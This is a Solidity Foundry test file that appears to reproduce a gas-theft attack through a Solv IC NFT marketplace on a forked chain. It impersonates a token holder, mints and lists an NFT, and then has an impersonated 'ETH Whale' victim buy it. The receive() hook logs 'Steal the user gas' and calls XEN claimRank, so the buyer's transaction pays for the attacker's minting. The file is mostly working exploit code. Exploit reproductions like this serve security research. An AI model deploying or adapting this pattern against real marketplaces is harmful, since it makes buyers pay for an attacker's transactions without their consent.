// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/console.sol";
import "forge-std/Test.sol";

interface CheatCodes {
    function startPrank(address) external;

    function stopPrank() external;
}

interface IERC20 {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function withdraw(uint256 wad) external;

    function deposit(uint256 wad) external returns (bool);

    function owner() external view returns (address);
}

interface IERC721 {
    event Transfer(
        address indexed from,
        address indexed to,
        uint256 indexed tokenId
    );
    event Approval(
        address indexed owner,
        address indexed approved,
        uint256 indexed tokenId
    );
    event ApprovalForAll(
        address indexed owner,
        address indexed operator,
        bool approved
    );

    function balanceOf(address owner) external view returns (uint256 balance);

    function ownerOf(uint256 tokenId) external view returns (address owner);

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    function approve(address to, uint256 tokenId) external;

    function getApproved(uint256 tokenId)
        external
        view
        returns (address operator);

    function setApprovalForAll(address operator, bool _approved) external;

    function isApprovedForAll(address owner, address operator)
        external
        view
        returns (bool);

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes calldata data
    ) external;

    function tokenOfOwnerByIndex(address owner, uint256 index)
        external
        returns (uint256);
}

interface SolvICMarket {
    function buyByUnits(uint24 saleId_, uint128 units_) external payable;

    function approve(address spender, uint256 rawAmount) external;

    function mint(
        uint64 term_,
        uint256 amount_,
        uint64[] memory maturities_,
        uint32[] memory percentages_,
        string memory originalInvestor_
    ) external;

    function publishFixedPrice(
        address icToken_,
        uint24 tokenId_,
        address currency_,
        uint128 min_,
        uint128 max_,
        uint32 startTime_,
        bool useAllowList_,
        uint128 price_
    ) external returns (uint24 saleId);

    function remove(uint24 saleId_) external;
}

interface IcSOLVNFT {
    function claim(uint256 _nftIndex, uint256 _quantity) external;

    function mint(
        uint64 term_,
        uint256 amount_,
        uint64[] memory maturities_,
        uint32[] memory percentages_,
        string memory originalInvestor_
    ) external;
}

interface XEN {
    function claimRank(uint256 term) external;
}

contract ContractTest is Test {
    SolvICMarket solvcmarket =
        SolvICMarket(payable(0xD91A208995bfBde9D133c39417FBD352e595650b));

    IERC721 private constant icSOLV =
        IERC721(0xfdcdE28359Db316957534e825327d99D9f4a5d17);

    IcSOLVNFT icsolvnft = IcSOLVNFT(0xfdcdE28359Db316957534e825327d99D9f4a5d17);

    IERC20 private constant solv =
        IERC20(0x256F2d67e52fE834726D2DDCD8413654F5Eb8b53);

    address vestingpool = 0x7D0C93DcAD6f6B38C81431d7262CF0E48770B81a;

    XEN xen = XEN(0x06450dEe7FD2Fb8E39061434BAbCFC05599a6Fb8);

    address eth = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    CheatCodes constant cheat =
        CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    uint256 public minted_tokenid;

    uint24 saleId;

    function setUp() public {}

    function testFirstBuy() public {
        // FirstBuy();
        FirstSolvTransfer();
        FirstMint();
        FirstPublish();
        VictimBuy();
    }

    function FirstSolvTransfer() internal {
        cheat.startPrank(0x0659671806d17C1E46e19A5875A73C2d20E54172);
        IERC20(address(solv)).transfer(address(this), 5000000000000000000);

        console.log(
            "solv balance %s",
            IERC20(address(solv)).balanceOf(address(this))
        );
        cheat.stopPrank();
    }

    function FirstMint() internal {
        solv.approve(vestingpool, type(uint256).max);

        uint64[] memory firstblock = new uint64[](1);
        firstblock[0] = uint64(block.timestamp);

        uint32[] memory percent = new uint32[](1);
        percent[0] = uint32(10000);

        uint256 solvbal = IERC20(address(solv)).balanceOf(address(this));

        icsolvnft.mint(0, solvbal, firstblock, percent, "");

        minted_tokenid = icSOLV.tokenOfOwnerByIndex(address(this), 0);

        console.log(
            "Minted NFT balance %s",
            IERC721(address(icSOLV)).balanceOf(address(this))
        );

        console.log("Newly minted token id %s", minted_tokenid);
    }

    function FirstPublish() public {
        icSOLV.approve(address(solvcmarket), minted_tokenid);

        uint32 secondblock = uint32(block.timestamp);

        uint24 minted_tokenid2 = uint24(minted_tokenid);

        saleId = solvcmarket.publishFixedPrice(
            address(icSOLV),
            minted_tokenid2,
            eth,
            0,
            0,
            secondblock,
            false,
            1000000000000000
        );
    }

    function VictimBuy() internal {
        cheat.startPrank(0x06920C9fC643De77B99cB7670A944AD31eaAA260); //ETH Whale
        solvcmarket.buyByUnits{value: 1000000000000000 wei}(
            saleId,
            1000000000000000000
        );
        cheat.stopPrank();
    }

    function FirstBuy() internal {
        solvcmarket.buyByUnits{value: 45000000000000000 wei}(
            5350,
            5000000000000000000
        );
    }

    function onVNFTReceived(
        address operator,
        address from,
        uint256 tokenId,
        uint256 units,
        bytes calldata data
    ) external pure returns (bytes4) {
        operator;
        from;
        tokenId;
        units;
        data;

        bytes4 demo = 0xb382cdcd;
        return demo;
    }

    receive() external payable {
        console.log("Steal the user gas");
        xen.claimRank(1);
    }
}
